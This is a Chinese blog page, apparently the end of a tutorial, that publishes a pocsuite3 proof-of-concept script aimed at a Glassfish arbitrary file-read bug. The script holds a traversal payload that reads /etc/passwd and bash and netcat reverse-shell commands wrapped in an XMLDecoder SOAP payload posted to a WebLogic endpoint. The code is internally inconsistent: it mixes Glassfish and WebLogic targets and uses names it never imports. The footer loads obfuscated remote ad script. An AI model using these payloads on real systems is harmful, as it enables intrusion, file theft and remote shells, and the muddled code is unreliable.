<span class="token keyword">from</span> pocsuite3<span class="token punctuation">.</span>api <span class="token keyword">import</span> Output<span class="token punctuation">,</span> POCBase<span class="token punctuation">,</span> register_poc<span class="token punctuation">,</span> requests<span class="token punctuation">,</span> logger<span class="token punctuation">,</span> POC_CATEGORY<span class="token punctuation">,</span> OptDict<span class="token punctuation">,</span> VUL_TYPE
<span class="token keyword">from</span> pocsuite3<span class="token punctuation">.</span>api <span class="token keyword">import</span> get_listener_ip<span class="token punctuation">,</span> get_listener_port
<span class="token keyword">from</span> pocsuite3<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>utils <span class="token keyword">import</span> random_str


<span class="token keyword">class</span> <span class="token class-name">DemoPOC</span><span class="token punctuation">(</span>POCBase<span class="token punctuation">)</span><span class="token punctuation">:</span>
    vulID <span class="token operator">=</span> <span class="token string">'97009'</span>  <span class="token comment"># ssvid</span>
    version <span class="token operator">=</span> <span class="token string">'3.0'</span>
    author <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'xiaodi'</span><span class="token punctuation">]</span>
    vulDate <span class="token operator">=</span> <span class="token string">'2020-12-22'</span>
    createDate <span class="token operator">=</span> <span class="token string">'2020-12-22'</span>
    updateDate <span class="token operator">=</span> <span class="token string">'2020-12-22'</span>
    references <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'https://www.xiaodi8.com'</span><span class="token punctuation">]</span>
    name <span class="token operator">=</span> <span class="token string">'Glassfish任意文件读取漏洞'</span>
    appPowerLink <span class="token operator">=</span> <span class="token string">''</span>
    appName <span class="token operator">=</span> <span class="token string">'Glassfish'</span>
    appVersion <span class="token operator">=</span> <span class="token string">'&lt; 10.3.6'</span>
    vulType <span class="token operator">=</span> VUL_TYPE<span class="token punctuation">.</span>CODE_EXECUTION
    desc <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
        Glassfish任意文件读取漏洞将导致敏感数据泄露，进一步利用会造成权限丢失等安全隐患！
    '''</span>
    samples <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    install_requires <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">]</span>
    category <span class="token operator">=</span> POC_CATEGORY<span class="token punctuation">.</span>EXPLOITS<span class="token punctuation">.</span>REMOTE

    <span class="token keyword">def</span> <span class="token function">_options</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        o <span class="token operator">=</span> OrderedDict<span class="token punctuation">(</span><span class="token punctuation">)</span>
        payload <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">"nc"</span><span class="token punctuation">:</span> <span class="token string">"rm -f /tmp/p;mknod /tmp/p p &amp;amp;&amp;amp; nc {0} {1} 0/tmp/p"</span><span class="token punctuation">,</span>
            <span class="token string">"bash"</span><span class="token punctuation">:</span> <span class="token string">"bash -i &amp;gt;&amp;amp; /dev/tcp/{0}/{1} 0&amp;gt;&amp;amp;1"</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span>
        o<span class="token punctuation">[</span><span class="token string">"command"</span><span class="token punctuation">]</span> <span class="token operator">=</span> OptDict<span class="token punctuation">(</span>selected<span class="token operator">=</span><span class="token string">"bash"</span><span class="token punctuation">,</span> default<span class="token operator">=</span>payload<span class="token punctuation">)</span>
        <span class="token keyword">return</span> o

    <span class="token keyword">def</span> <span class="token function">get_check_payload</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> lhost<span class="token punctuation">,</span> lport<span class="token punctuation">,</span> random_uri<span class="token punctuation">)</span><span class="token punctuation">:</span>
        check_payload <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
            &lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
              &lt;soapenv:Header&gt;
                &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;
                  &lt;java version="1.8" class="java.beans.XMLDecoder"&gt;
                    &lt;object id="url" class="java.net.URL"&gt;
                      &lt;string&gt;http://{lhost}:{lport}/{random_uri}&lt;/string&gt;
                    &lt;/object&gt;
                    &lt;object idref="url"&gt;
                      &lt;void id="stream" method = "openStream" /&gt;
                    &lt;/object&gt;
                  &lt;/java&gt;
                &lt;/work:WorkContext&gt;
                &lt;/soapenv:Header&gt;
              &lt;soapenv:Body/&gt;
            &lt;/soapenv:Envelope&gt;
        '''</span>

        <span class="token keyword">return</span> check_payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>
            lhost<span class="token operator">=</span>lhost<span class="token punctuation">,</span> lport<span class="token operator">=</span>lport<span class="token punctuation">,</span> random_uri<span class="token operator">=</span>random_uri<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">_verify</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        result<span class="token operator">=</span><span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>
        veri_url<span class="token operator">=</span>self<span class="token punctuation">.</span>url
        payload<span class="token operator">=</span><span class="token string">'/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token comment">#requests.post(veri_url, data=payload, headers=headers)</span>
            resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>veri_url<span class="token operator">+</span>payload<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
            <span class="token comment">#pattern = 'http://{0}(:{1})?/{2}'.format(check_host, check_port, random_uri)</span>

            <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>
                result<span class="token punctuation">[</span><span class="token string">'VerifyInfo'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>
                result<span class="token punctuation">[</span><span class="token string">'VerifyInfo'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'URL'</span><span class="token punctuation">]</span> <span class="token operator">=</span> veri_url
                result<span class="token punctuation">[</span><span class="token string">'VerifyInfo'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'Payload'</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                <span class="token keyword">pass</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>parse_output<span class="token punctuation">(</span>result<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">parse_output</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">:</span>
        output <span class="token operator">=</span> Output<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
        <span class="token keyword">if</span> result<span class="token punctuation">:</span>
            output<span class="token punctuation">.</span>success<span class="token punctuation">(</span>result<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            output<span class="token punctuation">.</span>fail<span class="token punctuation">(</span><span class="token string">'target is not vulnerable'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> output

    <span class="token keyword">def</span> <span class="token function">_attack</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>_verify<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">get_shell_payload</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cmd_base<span class="token punctuation">,</span> cmd_opt<span class="token punctuation">,</span> cmd_payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
        shell_payload <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
            &lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;
              &lt;soapenv:Header&gt;
                &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;
                  &lt;java&gt;
                    &lt;object class="java.lang.ProcessBuilder"&gt;
                      &lt;array class="java.lang.String" length="3" &gt;
                        &lt;void index="0"&gt;
                          &lt;string&gt;{cmd_base}&lt;/string&gt;
                        &lt;/void&gt;
                        &lt;void index="1"&gt;
                          &lt;string&gt;{cmd_opt}&lt;/string&gt;
                        &lt;/void&gt;
                        &lt;void index="2"&gt;
                          &lt;string&gt;{cmd_payload}&lt;/string&gt;
                        &lt;/void&gt;
                      &lt;/array&gt;
                      &lt;void method="start"/&gt;
                    &lt;/object&gt;
                  &lt;/java&gt;
                &lt;/work:WorkContext&gt;
              &lt;/soapenv:Header&gt;
              &lt;soapenv:Body/&gt;
            &lt;/soapenv:Envelope&gt;
        '''</span>
        <span class="token keyword">return</span> shell_payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>cmd_base<span class="token operator">=</span>cmd_base<span class="token punctuation">,</span> cmd_opt<span class="token operator">=</span>cmd_opt<span class="token punctuation">,</span>
                                    cmd_payload<span class="token operator">=</span>cmd_payload<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">_shell</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        vul_url <span class="token operator">=</span> urljoin<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> <span class="token string">'/wls-wsat/CoordinatorPortType'</span><span class="token punctuation">)</span>
        cmd <span class="token operator">=</span> <span class="token string">'bash -i &amp;gt;&amp;amp; /dev/tcp/{0}/{1} 0&amp;gt;&amp;amp;1'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>
            get_listener_ip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> get_listener_port<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        shell_payload <span class="token operator">=</span> self<span class="token punctuation">.</span>get_shell_payload<span class="token punctuation">(</span><span class="token string">'/bin/bash'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
        headers <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"text/xml;charset=UTF-8"</span><span class="token punctuation">,</span>
            <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">try</span><span class="token punctuation">:</span>
            requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>vul_url<span class="token punctuation">,</span> data<span class="token operator">=</span>shell_payload<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            logger<span class="token punctuation">.</span>warn<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">parse_output</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">:</span>
        output <span class="token operator">=</span> Output<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
        <span class="token keyword">if</span> result<span class="token punctuation">:</span>
            output<span class="token punctuation">.</span>success<span class="token punctuation">(</span>result<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            output<span class="token punctuation">.</span>fail<span class="token punctuation">(</span><span class="token string">'target is not vulnerable'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> output


register_poc<span class="token punctuation">(</span>DemoPOC<span class="token punctuation">)</span>

</code></pre> 
<h3><a id="_865"></a>涉及资源：</h3> 
<p>http://sqlmap.org/<br> https://github.com/knownsec/pocsuite/<br> https://www.freebuf.com/articles/web/204875.html<br> https://www.freebuf.com/articles/people/162868.html<br> https://pan.baidu.com/s/13y3U6jX3WUYmnfKnXT8abQ 提取码：xiao</p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/94bc78c9c0e3198fe6dfe1d230208977/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">python语言下使用opencv接口cv2.VideoCapture()接口调用海康机器人工业相机</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/c676d05c86ea7d20c01be652e79fa087/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">自定义搭建简易web框架</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>